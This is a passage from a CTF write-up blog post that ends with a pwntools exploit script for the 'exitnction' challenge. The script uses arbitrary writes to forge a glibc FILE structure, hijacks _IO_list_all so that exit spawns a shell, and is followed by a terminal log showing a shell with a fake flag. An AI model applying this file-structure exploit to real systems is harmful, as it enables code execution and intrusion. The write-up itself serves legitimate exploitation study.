</div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">37</div></div><div class="code"><span style="--0:#24292E;--1:#E1E4E8">write(pieBase </span><span style="--0:#BF3441;--1:#F97583">+</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#BF3441;--1:#F97583">0x</span><span style="--0:#005CC5;--1:#79B8FF">4210</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#BF3441;--1:#F97583">+</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#BF3441;--1:#F97583">0x</span><span style="--0:#005CC5;--1:#79B8FF">a0</span><span style="--0:#24292E;--1:#E1E4E8">, p64(pieBase </span><span style="--0:#BF3441;--1:#F97583">+</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#BF3441;--1:#F97583">0x</span><span style="--0:#005CC5;--1:#79B8FF">4210</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#BF3441;--1:#F97583">-</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#BF3441;--1:#F97583">0x</span><span style="--0:#005CC5;--1:#79B8FF">20</span><span style="--0:#24292E;--1:#E1E4E8">))</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">38</div></div><div class="code"><span style="--0:#24292E;--1:#E1E4E8">write(pieBase </span><span style="--0:#BF3441;--1:#F97583">+</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#BF3441;--1:#F97583">0x</span><span style="--0:#005CC5;--1:#79B8FF">4210</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#BF3441;--1:#F97583">+</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#BF3441;--1:#F97583">0x</span><span style="--0:#005CC5;--1:#79B8FF">c0</span><span style="--0:#24292E;--1:#E1E4E8">, p64(pieBase </span><span style="--0:#BF3441;--1:#F97583">+</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#BF3441;--1:#F97583">0x</span><span style="--0:#005CC5;--1:#79B8FF">4210</span><span style="--0:#24292E;--1:#E1E4E8">))</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">39</div></div><div class="code"><span style="--0:#24292E;--1:#E1E4E8">write(pieBase </span><span style="--0:#BF3441;--1:#F97583">+</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#BF3441;--1:#F97583">0x</span><span style="--0:#005CC5;--1:#79B8FF">4210</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#BF3441;--1:#F97583">+</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#BF3441;--1:#F97583">0x</span><span style="--0:#005CC5;--1:#79B8FF">d8</span><span style="--0:#24292E;--1:#E1E4E8">, p64((libc.symbols[</span><span style="--0:#032F62;--1:#9ECBFF">&#39;_IO_wfile_jumps&#39;</span><span style="--0:#24292E;--1:#E1E4E8">] </span><span style="--0:#BF3441;--1:#F97583">+</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#BF3441;--1:#F97583">0x</span><span style="--0:#005CC5;--1:#79B8FF">48</span><span style="--0:#24292E;--1:#E1E4E8">) </span><span style="--0:#BF3441;--1:#F97583">-</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#BF3441;--1:#F97583">0x</span><span style="--0:#005CC5;--1:#79B8FF">18</span><span style="--0:#24292E;--1:#E1E4E8">))</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">40</div></div><div class="code"><span style="--0:#24292E;--1:#E1E4E8">write(pieBase </span><span style="--0:#BF3441;--1:#F97583">+</span><span style="--0:#24292E;--1:#E1E4E8"> exe.symbols[</span><span style="--0:#032F62;--1:#9ECBFF">&#39;sent_mails&#39;</span><span style="--0:#24292E;--1:#E1E4E8">], p64(</span><span style="--0:#BF3441;--1:#F97583">-</span><span style="--0:#005CC5;--1:#79B8FF">1</span><span style="--0:#24292E;--1:#E1E4E8">, </span><span style="--0:#AE4B07;--1:#FFAB70">sign</span><span style="--0:#BF3441;--1:#F97583">=</span><span style="--0:#005CC5;--1:#79B8FF">True</span><span style="--0:#24292E;--1:#E1E4E8">))</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">41</div></div><div class="code">
</div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">42</div></div><div class="code"><span style="--0:#24292E;--1:#E1E4E8">write(libc.symbols[</span><span style="--0:#032F62;--1:#9ECBFF">&#39;_IO_list_all&#39;</span><span style="--0:#24292E;--1:#E1E4E8">], p64(pieBase </span><span style="--0:#BF3441;--1:#F97583">+</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#BF3441;--1:#F97583">0x</span><span style="--0:#005CC5;--1:#79B8FF">4210</span><span style="--0:#24292E;--1:#E1E4E8">))</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">43</div></div><div class="code">
</div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">44</div></div><div class="code"><span style="--0:#24292E;--1:#E1E4E8">io.sendlineafter(</span><span style="--0:#BF3441;--1:#F97583">b</span><span style="--0:#032F62;--1:#9ECBFF">&quot;&gt; &quot;</span><span style="--0:#24292E;--1:#E1E4E8">, </span><span style="--0:#BF3441;--1:#F97583">b</span><span style="--0:#032F62;--1:#9ECBFF">&quot;exit&quot;</span><span style="--0:#24292E;--1:#E1E4E8">)</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">45</div></div><div class="code"><span style="--0:#24292E;--1:#E1E4E8">io.interactive()</span></div></div></code></pre><div class="copy"><button title="Copy to clipboard" data-copied="Copied!" data-code="#!/usr/bin/env python3from pwn import *exe = context.binary = ELF(args.EXE or './exitnction')libc = ELF(exe.libc.path)def start(argv=[], *a, **kw):    if args.GDB:        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)    else:        return process([exe.path] + argv, *a, **kw)def write(addr, data):    io.sendlineafter(b&#34;> &#34;, b&#34;write&#34;)    io.sendlineafter(b&#34;: 0x&#34;, hex(addr).encode())    io.sendlineafter(b&#34;(8 chars): &#34;, data)    io.sendlineafter(b&#34;(64 chars): &#34;, b&#34;&#34;)gdbscript = '''b exit'''.format(**locals())io = start()io.sendlineafter(b&#34;> &#34;, b&#34;server&#34;)io.recvuntil(b&#34;0x&#34;)pieBase = int(io.recvline().strip().decode()[:-1], 16) - exe.symbols['current_license']io.recvuntil(b&#34;0x&#34;)libc.address = int(io.recvline().strip().decode()[:-1], 16) - libc.symbols['exit']write(pieBase + 0x4210, b&#34;/bin/sh\x00&#34;.ljust(0x8, b&#34;\x00&#34;))write(pieBase + 0x4210 + 0x18, p64(libc.symbols[&#34;system&#34;]))write(pieBase + 0x4210 + 0x88 + 1, p64(libc.address + 0x205700)[1:])write(pieBase + exe.symbols['sent_mails'], p64(-1, sign=True))write(pieBase + 0x4210 + 0xa0, p64(pieBase + 0x4210 - 0x20))write(pieBase + 0x4210 + 0xc0, p64(pieBase + 0x4210))write(pieBase + 0x4210 + 0xd8, p64((libc.symbols['_IO_wfile_jumps'] + 0x48) - 0x18))write(pieBase + exe.symbols['sent_mails'], p64(-1, sign=True))write(libc.symbols['_IO_list_all'], p64(pieBase + 0x4210))io.sendlineafter(b&#34;> &#34;, b&#34;exit&#34;)io.interactive()"><div></div></button></div></figure></div>
<div class="expressive-code"><figure class="frame"><figcaption class="header"></figcaption><pre data-language="plaintext" class="wrap" style="--ecMaxLine:57ch"><code><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">1</div></div><div class="code"><span style="--0:#24292e;--1:#e1e4e8">┌──(kali㉿kali)-[~/…/ctf-scripts/openecsc/2025/exitnction]</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">2</div></div><div class="code"><span style="--0:#24292e;--1:#e1e4e8">└─$ python3 xpl.py</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">3</div></div><div class="code"><span style="--0:#24292e;--1:#e1e4e8">...SNIP...</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">4</div></div><div class="code"><span style="--0:#24292e;--1:#e1e4e8">$ cat flag.txt</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">5</div></div><div class="code"><span style="--0:#24292e;--1:#e1e4e8">fakeflag{FAKE_FLAG_4_TESTING}</span></div></div></code></pre><div class="copy"><button title="Copy to clipboard" data-copied="Copied!" data-code="┌──(kali㉿kali)-[~/…/ctf-scripts/openecsc/2025/exitnction]└─$ python3 xpl.py...SNIP...$ cat flag.txtfakeflag{FAKE_FLAG_4_TESTING}"><div></div></button></div></figure></div>
<h2 id="conclusion">Conclusion</h2>
<p>Alright — that’s the ride. I hope this made sense and thanks for reading — hope you enjoyed the teardown.
If anything above looks wrong, sloppy, or just plain cursed — tell me. I’m pretty new to file struct exploitation so corrections, nitpicks, and roasts are welcome.</p>
<h2 id="references">References</h2>
<ul>
<li><a href="https://blog.kylebot.net/2022/10/22/angry-FSROP/" rel="nofollow noreferrer noopener" target="_blank">https://blog.kylebot.net/2022/10/22/angry-FSROP/</a></li>
<li><a href="https://chovid99.github.io/posts/file-structure-attack-part-1/" rel="nofollow noreferrer noopener" target="_blank">https://chovid99.github.io/posts/file-structure-attack-part-1/</a></li>
<li><a href="https://elixir.bootlin.com/glibc/glibc-2.39/source" rel="nofollow noreferrer noopener" target="_blank">https://elixir.bootlin.com/glibc/glibc-2.39/source</a></li>
<li><a href="https://zenn.dev/rona/articles/5c6f11aabfaf9e" rel="nofollow noreferrer noopener" target="_blank">https://zenn.dev/rona/articles/5c6f11aabfaf9e</a></li>
</ul> </article>  <nav class="col-start-2 grid grid-cols-1 gap-4 sm:grid-cols-2"> <a href="/blog/securinets-quals-2025_easy_jail#post-title" target="_self" class="duration-300 ease-in-out gap-2 whitespace-nowrap text-sm font-medium transition-all disabled:pointer-events-none disabled:opacity-50 [&#38;_svg]:pointer-events-none [&#38;_svg:not([class*='size-'])]:size-4 shrink-0 [&#38;_svg]:shrink-0 outline-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive border bg-background hover:bg-muted hover:text-foreground dark:bg-input/30 dark:border-input dark:hover:bg-input/50 px-4 py-2 has-[>svg]:px-3 rounded-lg group flex items-center justify-start size-full" aria-disabled="false">  <svg width="1em" height="1em" viewBox="0 0 24 24" class="mr-2 size-4 transition-transform group-hover:-translate-x-1" data-icon="lucide:arrow-left">   <use href="#ai:lucide:arrow-left"></use>  </svg> <div class="flex flex-col items-start overflow-hidden text-wrap"> <span class="text-muted-foreground text-left text-xs"> Previous Post </span> <span class="w-full text-left text-sm text-balance text-ellipsis"> Securinets Quals 2025 – misc/easy-jail: pyjail </span> </div>  </a>  <a href="/blog/buckeye-2025_heap_exploitation#post-title" target="_self" class="duration-300 ease-in-out gap-2 whitespace-nowrap text-sm font-medium transition-all disabled:pointer-events-none disabled:opacity-50 [&#38;_svg]:pointer-events-none [&#38;_svg:not([class*='size-'])]:size-4 shrink-0 [&#38;_svg]:shrink-0 outline-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive border bg-background hover:bg-muted hover:text-foreground dark:bg-input/30 dark:border-input dark:hover:bg-input/50 px-4 py-2 has-[>svg]:px-3 rounded-lg group flex items-center justify-end size-full" aria-disabled="false">  <div class="flex flex-col items-end overflow-hidden text-wrap"> <span class="text-muted-foreground text-right text-xs"> Next Post </span> <span class="w-full text-right text-sm text-balance text-ellipsis"> Buckeye 2025 – forensics/heap_exploitation? </span> </div> <svg width="1em" height="1em" viewBox="0 0 24 24" class="ml-2 size-4 transition-transform group-hover:translate-x-1" data-icon="lucide:arrow-right">   <use href="#ai:lucide:arrow-right"></use>  </svg>  </a> </nav> </section> <button data-slot="button" class="items-center justify-center gap-2 whitespace-nowrap rounded-md text-sm font-medium transition-all disabled:pointer-events-none disabled:opacity-50 [&amp;_svg]:pointer-events-none [&amp;_svg:not([class*=&#x27;size-&#x27;])]:size-4 shrink-0 [&amp;_svg]:shrink-0 outline-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive border bg-background hover:bg-muted hover:text-foreground dark:bg-input/30 dark:border-input dark:hover:bg-input/50 size-9 group fixed right-8 bottom-8 z-50 hidden" id="scroll-to-top" title="Scroll to top" aria-label="Scroll to top"> <svg width="1em" height="1em" class="mx-auto size-4 transition-all group-hover:-translate-y-0.5" data-icon="lucide:arrow-up">   <symbol id="ai:lucide:arrow-up" viewBox="0 0 24 24"><path fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="m5 12l7-7l7 7m-7 7V5"/></symbol><use href="#ai:lucide:arrow-up"></use>  </svg> </button> <script type="module">if(document.querySelector(".katex")&&!document.querySelector('link[href*="katex.min.css"]')){const e=document.createElement("link");e.rel="stylesheet",e.href="https://cdn.jsdelivr.net/npm/katex@0.16.22/dist/katex.min.css",document.head.appendChild(e)}</script>  </main> <footer class="mx-auto mb-8 flex w-full max-w-3xl flex-col items-center justify-center gap-y-2 px-4 sm:mb-4 sm:flex-row sm:justify-between"> <div class="flex flex-wrap items-center justify-center gap-x-2 text-center"> <span class="text-muted-foreground text-sm">
&copy; 2025 z0v3r1n
</span> </div> <ul class="flex flex-wrap gap-2" role="list"> <li> <a href="https://github.com/z0v3r1n" target="_blank" class="duration-300 ease-in-out inline-flex items-center justify-center gap-2 whitespace-nowrap rounded-md text-sm font-medium transition-all disabled:pointer-events-none disabled:opacity-50 [&#38;_svg]:pointer-events-none [&#38;_svg:not([class*='size-'])]:size-4 shrink-0 [&#38;_svg]:shrink-0 outline-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive border bg-background hover:bg-muted hover:text-foreground dark:bg-input/30 dark:border-input dark:hover:bg-input/50 size-9" aria-label="GitHub" title="GitHub">  <svg width="1em" height="1em" class="size-4" data-icon="lucide:github">   <symbol id="ai:lucide:github" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2"><path d="M15 22v-4a4.8 4.8 0 0 0-1-3.5c3 0 6-2 6-5.5c.08-1.25-.27-2.48-1-3.5c.28-1.15.28-2.35 0-3.5c0 0-1 0-3 1.5c-2.64-.5-5.36-.5-8 0C6 2 5 2 5 2c-.3 1.15-.3 2.35 0 3.5A5.4 5.4 0 0 0 4 9c0 3.5 3 5.5 6 5.5c-.39.49-.68 1.05-.85 1.65S8.93 17.38 9 18v4"/><path d="M9 18c-4.51 2-5-2-7-2"/></g></symbol><use href="#ai:lucide:github"></use>  </svg>  </a> </li><li> <a href="https://x.com/z0v3r1n" target="_blank" class="duration-300 ease-in-out inline-flex items-center justify-center gap-2 whitespace-nowrap rounded-md text-sm font-medium transition-all disabled:pointer-events-none disabled:opacity-50 [&#38;_svg]:pointer-events-none [&#38;_svg:not([class*='size-'])]:size-4 shrink-0 [&#38;_svg]:shrink-0 outline-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive border bg-background hover:bg-muted hover:text-foreground dark:bg-input/30 dark:border-input dark:hover:bg-input/50 size-9" aria-label="Twitter" title="Twitter">  <svg width="1em" height="1em" class="size-4" data-icon="lucide:twitter">   <symbol id="ai:lucide:twitter" viewBox="0 0 24 24"><path fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M22 4s-.7 2.1-2 3.4c1.6 10-9.4 17.3-18 11.6c2.2.1 4.4-.6 6-2C3 15.5.5 9.6 3 5c2.2 2.6 5.6 4.1 9 4c-.9-4.2 4-6.6 7-3.8c1.1 0 3-1.2 3-1.2"/></symbol><use href="#ai:lucide:twitter"></use>  </svg>  </a> </li><li> <a href="mailto:zoverin@proton.me" target="_blank" class="duration-300 ease-in-out inline-flex items-center justify-center gap-2 whitespace-nowrap rounded-md text-sm font-medium transition-all disabled:pointer-events-none disabled:opacity-50 [&#38;_svg]:pointer-events-none [&#38;_svg:not([class*='size-'])]:size-4 shrink-0 [&#38;_svg]:shrink-0 outline-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive border bg-background hover:bg-muted hover:text-foreground dark:bg-input/30 dark:border-input dark:hover:bg-input/50 size-9" aria-label="Email" title="Email">  <svg width="1em" height="1em" class="size-4" data-icon="lucide:mail">   <symbol id="ai:lucide:mail" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2"><path d="m22 7l-8.991 5.727a2 2 0 0 1-2.009 0L2 7"/><rect width="20" height="16" x="2" y="4" rx="2"/></g></symbol><use href="#ai:lucide:mail"></use>  </svg>  </a> </li> </ul> </footer> </body></html> <script type="module">document.addEventListener("astro:page-load",()=>{const o=document.getElementById("scroll-to-top"),t=document.querySelector("footer");o&&t&&(o.addEventListener("click",()=>{window.scrollTo({top:0,behavior:"smooth"})}),window.addEventListener("scroll",()=>{const e=t.getBoundingClientRect().top<=window.innerHeight;o.classList.toggle("hidden",window.scrollY<=300||e)}))});</script>